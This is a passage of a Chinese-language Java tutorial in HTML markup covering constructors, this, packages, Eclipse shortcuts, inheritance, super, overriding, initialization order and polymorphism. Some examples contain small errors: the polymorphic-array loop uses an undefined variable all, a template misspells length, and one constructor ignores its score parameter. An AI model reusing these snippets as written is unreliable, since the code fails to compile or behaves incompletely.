class="line">【修饰符】 <span class="class"><span class="keyword">class</span> 类名</span>&#123;</span><br><span class="line">    【修饰符】 类名()&#123;<span class="comment">//无参构造</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    【修饰符】 类名(形参列表)&#123;<span class="comment">//有参构造</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3、构造器的特点：</p><p>（1）所有的类都有构造器</p><p>（2）如果一个类没有显式/明确的声明一个构造器，那么编译器将会自动添加一个默认的无参构造</p><p>（3）如果一个类显式/明确的声明了构造器，那么编译器将不再自动添加默认的无参构造，如果需要，那么就需要手动添加</p><p>（4）构造器的名称必须与类名相同</p><p>（5）构造器没有返回值类型</p><p>（6）构造器可以重载</p><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Circle</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> radius;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Circle</span><span class="params">()</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Circle</span><span class="params">(<span class="keyword">double</span> r)</span></span>&#123;</span><br><span class="line">        radius = r;<span class="comment">//为radius赋值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-3-关键字this"><a href="#6-3-关键字this" class="headerlink" title="6.3 关键字this"></a>6.3 关键字this</h2><p>1、this关键字：</p><p>意思：当前对象</p><p>（1）如果出现在构造器中：表示正在创建的对象</p><p>（2）如果出现在成员方法中：表示正在调用这个方法的对象</p><p>2、this的用法：</p><p>（1）this.属性</p><p>当局部变量与成员变量同名时，那么可以在成员变量的而前面加“this.”用于区别</p><p>（2）this.方法</p><p>调用当前对象的成员方法，完全可以省略“this.”</p><p>（3）this()或this(实参列表)</p><p>this()表示调用本类的无参构造</p><p>this(实参列表)表示调用本类的有参构造</p><blockquote><p>this()或this(实参列表)要么没有，要么必须出现在构造器的首行</p></blockquote><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> score;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name, <span class="keyword">int</span> score)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setScore</span><span class="params">(<span class="keyword">int</span> score)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.score = score;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getScore</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> score;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3、成员变量与局部变量的区别？</p><p>这里只讨论实例变量（关于类变量见static部分）</p><p>（1）声明的位置不同</p><p>成员变量：类中方法外</p><p>局部变量：方法中或代码中</p><p>​    ①方法的形参列表</p><p>​    ②方法体中局部变量</p><p>​    ③代码块中的局部变量</p><p>（2）运行时在内存中的存储位置不同</p><p>成员变量：堆</p><p>局部变量：栈</p><blockquote><p>基本数据类型的变量在栈中，引用数据类型的变量在堆中：不准确</p></blockquote><p>（3）修饰符</p><p>成员变量：有很多修饰符，例如：权限修饰符</p><p>局部变量：不能加权限修饰符，唯一的能加的是final</p><p>（4）初始化</p><p>成员变量：有默认值</p><p>局部变量：没有默认值，必须手动初始化</p><p>（5）生命周期</p><p>成员变量：随着对象的创建而创建，随着对象被回收而消亡，即与对象同生共死。每一个对象都是独立的。</p><p>局部变量：方法调用时才分配，方法运行结束就没有了。每一次方法调用，都是独立的</p><h2 id="6-4-包"><a href="#6-4-包" class="headerlink" title="6.4 包"></a>6.4 包</h2><p>1、包的作用：</p><p>（1）可以避免类重名</p><p>有了包之后，类的全名称就变为：包.类名</p><p>（2）分类组织管理众多的类</p><p>例如：java.lang包，java.util包，java.io包…..</p><p>（3）可以控制某些类型或成员的可见范围</p><p>如果某个类型或者成员的权限修饰缺省的话，那么就仅限于本包使用</p><p>2、声明包的语法格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> 包名;</span><br></pre></td></tr></table></figure><blockquote><p>注意：</p><p>(1)必须在源文件的代码首行</p><p>(2)一个源文件只能有一个</p></blockquote><p>3、包的命名规范和习惯：<br>（1）所有单词都小写，每一个单词之间使用.分割<br>（2）习惯用公司的域名倒置</p><p>例如：com.atguigu.xxx;</p><blockquote><p>建议大家取包名时不要使用“java.xx”包</p></blockquote><p>4、使用其他包的类：</p><p>前提：被使用的类或成员的权限修饰符是&gt;缺省的</p><p>（1）使用类型的全名称</p><p>例如：java.util.Scanner input = new java.util.Scanner(System.in);</p><p>（2）使用import 语句之后，代码中使用简名称</p><p>5、import语句</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> 包.类名;</span><br><span class="line"><span class="keyword">import</span> 包.*;</span><br></pre></td></tr></table></figure><blockquote><p>注意：当使用两个不同包的同名类时，例如：java.util.Date和java.sql.Date。</p><p>一个使用全名称，一个使用简名称</p></blockquote><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Scanner input = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-5-eclipse的使用"><a href="#6-5-eclipse的使用" class="headerlink" title="6.5 eclipse的使用"></a>6.5 eclipse的使用</h2><p>1、eclipse管理项目和代码的结构</p><p>workspace –&gt; project –&gt; 包–&gt;类…</p><p>一个工作空间可以有多个项目。</p><p>2、快捷键</p><p>常规快捷键：</p><p>Ctrl + S：保存</p><p>Ctrl + C：复制</p><p>Ctrl + V：粘贴</p><p>Ctrl + X：剪切</p><p>Ctrl + Y：反撤销</p><p>Ctrl + Z：撤销</p><p>Ctrl + A：全选</p><p>eclipse中默认的快捷键：</p><p>Ctrl + 1：快速修复</p><p>Alt + /：代码提示</p><p>Alt + ?：  Alt + Shift + /   方法的形参列表提示</p><p>Ctrl + D：删除选中行</p><p>Ctrl + Alt + ↓：向下复制行</p><p>Ctrl + Alt + ↑：向上复制行</p><p>Alt + ↓：与下面的行交换位置</p><p>Alt + ↑：与下面的行交换位置</p><p>Ctrl + Shift + F：快速格式</p><p>Ctrl + /：单行注释，再按一次取消</p><p>Ctrl + Shift + /：多行注释</p><p>Ctrl + Shift +\：取消多行注释</p><p>Shift + 回车：在光标下一行插入新航开始编辑</p><p>Ctrl + Shift + 回车：在光标上一行插入新航开始编辑</p><p>Alt + Shift + A：多行编辑     再按一次退出多行编辑模式</p><p>Alt + Shift + S：弹出自动生成代码的菜单选择，包括自动生成构造器、get/set、equals……</p><p>Ctrl + Shift + O：快速导包</p><p>Ctrl + Shift + T：打开某个类的源文件</p><p>Ctrl + O：打开某个类型的摘要outline</p><p>3、快速开发的代码模板</p><p>代码模板 + Alt + /</p><p>（1）main</p><p>public static void main(String[] args){</p><p>}</p><p>（2）sysout</p><p>System.out.println();</p><p>（3）for</p><p>for(int i=0; i&lt;数组名.lenght; i++){</p><p>}</p><p>其他详细使用见《JavaSE_柴林燕_相关工具.docx》</p><h2 id="6-6-面向对象的基本特征之二：继承"><a href="#6-6-面向对象的基本特征之二：继承" class="headerlink" title="6.6 面向对象的基本特征之二：继承"></a>6.6 面向对象的基本特征之二：继承</h2><p>1、为什么要继承？继承的好处？（理解）</p><p>（1）代码的复用</p><p>（2）代码的扩展</p><p>2、如何实现继承？</p><p>语法格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">【修饰符】 <span class="class"><span class="keyword">class</span> 子类  <span class="keyword">extends</span> 父类</span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3、继承的特点</p><p>（1）子类会继承父类的所有特征（属性、方法）</p><p>但是，私有的在子类中是不能直接使用的</p><p>（2）子类不会继承父类的构造器</p><p>因为，父类的构造器是用于创建父类的对象的</p><p>（3）子类的构造器中又必须去调用父类的构造器</p><p>在创建子类对象的同时，为从父类继承的属性进行初始化用，可以借助父类的构造器中的代码为属性赋值。</p><p>（4）Java只支持单继承：一个子类只能有一个“直接”父类</p><p>（5）Java又支持多层继承：父类还可以有父类，特征会代代相传</p><p>（6）一个父类可以同时拥有很多个子类</p><h2 id="6-7-关键字super"><a href="#6-7-关键字super" class="headerlink" title="6.7 关键字super"></a>6.7 关键字super</h2><p>super关键字：引用父类的，找父类的xx</p><p>用法：</p><p>（1）super.属性</p><p>当子类声明了和父类同名的成员变量时，那么如果要表示某个成员变量是父类的，那么可以加“super.”</p><p>（2）super.方法</p><p>当子类重写了父类的方法，又需要在子类中调用父类被重写的方法，可以使用”super.”</p><p>（3）super()或super(实参列表)</p><p>super()：表示调用父类的无参构造</p><p>super(实参列表)：表示调用父类的有参构造</p><blockquote><p>注意：</p><p>（1）如果要写super()或super(实参列表)，必须写在子类构造器的首行</p><p>（2）如果子类的构造器中没有写：super()或super(实参列表)，那么默认会有 super()</p><p>（3）如果父类没有无参构造，那么在子类的构造器的首行“必须”写super(实参列表)</p></blockquote><h2 id="6-8-方法的重写"><a href="#6-8-方法的重写" class="headerlink" title="6.8 方法的重写"></a>6.8 方法的重写</h2><p>1、方法的重写（Override）</p><p>当子类继承了父类的方法时，又觉得父类的方法体的实现不适合于子类，那么子类可以选择进行重写。</p><p>2、方法的重写的要求</p><p>（1）方法名：必须相同</p><p>（2）形参列表：必须相同</p><p>（3）修饰符</p><p>​    权限修饰符： &gt;=</p><p>（4）返回值类型</p><p>​    如果是基本数据类型和void：必须相同</p><p>​    如果是引用数据类型：&lt;=</p><p>​    在Java中我们认为，在概念范围上：子类 &lt;父类</p><p>3、重载（Overload）与重写（Override）的区别</p><p>​    重载（Overload）：在同一个类中，方法名相同，形参列表不同，和返回值类型无关的两个或多个方法。</p><p>​    重写（Override）：在父子类之间。对方法签名的要求见上面。</p><p>特殊的重载：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestOverload</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">B b = <span class="keyword">new</span> B();</span><br><span class="line"><span class="comment">//b对象可以调用几个a方法</span></span><br><span class="line">b.a();</span><br><span class="line">b.a(<span class="string">""</span>);<span class="comment">//从b对象同时拥有两个方法名相同，形参不同的角度来说，算是重载</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">(String str)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-9-非静态代码块"><a href="#6-9-非静态代码块" class="headerlink" title="6.9 非静态代码块"></a>6.9 非静态代码块</h2><p>1、语法格式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">【修饰符】 <span class="class"><span class="keyword">class</span> 类名</span>&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        非静态代码块</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、作用</p><p>目的：在创建的过程中，为对象属性赋值，协助完成实例初始化的过程</p><p>3、什么时候执行？</p><p>（1）每次创建对象时都会执行</p><p>（2）优先于构造器执行</p><h2 id="6-10-实例初始化过程"><a href="#6-10-实例初始化过程" class="headerlink" title="6.10 实例初始化过程"></a>6.10 实例初始化过程</h2><p>1、概念描述</p><ul><li><p>实例初始化过程：实例对象创建的过程</p></li><li><p>实例初始化方法：实例对象创建时要执行的方法</p></li><li><p>实例初始化方法的由来：它是有编译器编译生成的</p></li><li><p>实例初始化方法的形式：<init>()或<init>(形参列表)</init></init></p></li><li><p>实例初始化方法的构成：</p><p>①属性的显式赋值代码</p><p>②非静态代码块的代码</p><p>③构造器的代码</p><blockquote><p>其中</p><p>①和②按顺序执行，从上往下</p><p>③在①和②的后面</p></blockquote></li></ul><p>因此一个类有几个构造器，就有几个实例初始化方法。</p><p>2、单个类实例初始化方法</p><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">"非静态代码块1"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> String str = assign();<span class="comment">//调用方法，来为str进行显式赋值</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Demo</span><span class="params">()</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">"无参构造"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Demo</span><span class="params">(String str)</span></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.str = str;</span><br><span class="line">System.out.println(<span class="string">"有参构造"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">"非静态代码块2"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">assign</span><span class="params">()</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">"assign方法"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">"hello"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>图解：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="imgs/1558960549421.png" alt="1558960549421" title>                </div>                <div class="image-caption">1558960549421</div>            </figure><p>3、父子类的实例初始化</p><p>注意：</p><p>（1）原先super()和super(实参列表)说是调用父类的构造器，现在就要纠正为调用父类的实例初始化方法了</p><p>（2）原先super()和super(实参列表)说是必须在子类构造器的首行，现在要纠正为必须在子类实例初始化方法的首行</p><p>结论：</p><p>（1）执行顺序是先父类实例初始化方法，再子类实例初始化方法</p><p>（2）如果子类重写了方法，通过子类对象调用，一定是执行重写过的方法</p><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ba</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> String str = assign();</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">"(1)父类的非静态代码块"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Ba</span><span class="params">()</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">"(2)父类的无参构造"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">assign</span><span class="params">()</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">"(3)父类的assign()"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">"ba"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Er</span> <span class="keyword">extends</span> <span class="title">Ba</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> String str = assign();</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">"(4)子类的非静态代码块"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Er</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//super()  ==&gt;调用父类的实例初始化方法，而且它在子类实例初始化方法的首行</span></span><br><span class="line">System.out.println(<span class="string">"(5)子类的无参构造"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">assign</span><span class="params">()</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">"(6)子类的assign()"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">"er"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Er();<span class="comment">//612645</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>图解：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="imgs/1558961723911.png" alt="1558961723911" title>                </div>                <div class="image-caption">1558961723911</div>            </figure><h2 id="6-11-面向对象的基本特征之三：多态"><a href="#6-11-面向对象的基本特征之三：多态" class="headerlink" title="6.11 面向对象的基本特征之三：多态"></a>6.11 面向对象的基本特征之三：多态</h2><p>1、多态：</p><p>语法格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">父类 引用/变量 = 子类的对象;</span><br></pre></td></tr></table></figure><p>2、前提：</p><p>（1）继承</p><p>（2）方法的重写</p><p>（3）多态引用</p><p>3、现象：</p><p>​    编译时看左边/“父类”，运行时看右边/“子类”。</p><p>​    编译时，因为按父类编译，那么只能父类有的方法，子类扩展的方法是无法调用的；    </p><p>​    执行时一定是运行子类重写的过的方法体。</p><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">"吃饭"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">walk</span><span class="params">()</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">"走路"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Woman</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">"细嚼慢咽的吃饭"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">walk</span><span class="params">()</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">"婀娜多姿走路"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shop</span><span class="params">()</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">"买买买..."</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">"狼吞虎咽的吃饭"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">walk</span><span class="params">()</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">"大摇大摆的走路"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">smoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">"吞云吐雾"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Person p = <span class="keyword">new</span> Woman();<span class="comment">//多态引用</span></span><br><span class="line">        p.eat();<span class="comment">//执行子类重写</span></span><br><span class="line">        p.walk();<span class="comment">//执行子类重写</span></span><br><span class="line">        <span class="comment">//p.shop();//无法调用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4、应用：</p><p>（1）多态参数：形参是父类，实参是子类对象</p><p>（2）多态数组：数组元素类型是父类，元素存储的是子类对象</p><p>示例代码：多态参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        test(<span class="keyword">new</span> Woman());<span class="comment">//实参是子类对象</span></span><br><span class="line">        test(<span class="keyword">new</span> Man());<span class="comment">//实参是子类对象</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">(Person p)</span></span>&#123;<span class="comment">//形参是父类类型</span></span><br><span class="line">        p.eat();</span><br><span class="line">        p.walk();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例代码：多态数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Person[] arr = <span class="keyword">new</span> Person[<span class="number">2</span>];<span class="comment">//多态数组</span></span><br><span class="line">        arr[<span class="number">0</span>] = <span class="keyword">new</span> Woman();</span><br><span class="line">        arr[<span class="number">1</span>] = <span class="keyword">new</span> Man();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;arr.length; i++)&#123;</span><br><span class="line">            all[i].eat();</span><br><span class="line">            all[i].walk();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5、向上转型与向下转型：父子类之间的转换</p><p>（1）向上转型：自动类型转换</p><p>​    当把子类的对象赋值给父类的变量时（即多态引用时），在编译时，这个对象就向上转型为父类。此时就看不见子类“特有、扩展”的方法。</p><p>（2）向下转型：强制转换。有风险，可能会报ClassCastException异常。</p><p>​    当需要把父类的变量赋值给一个子类的变量时，就需要向下转型。</p><p>​    <strong>要想转型成功，必须保证该变量中保存的对象的运行时类型是&lt;=强转的类型</strong></p><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 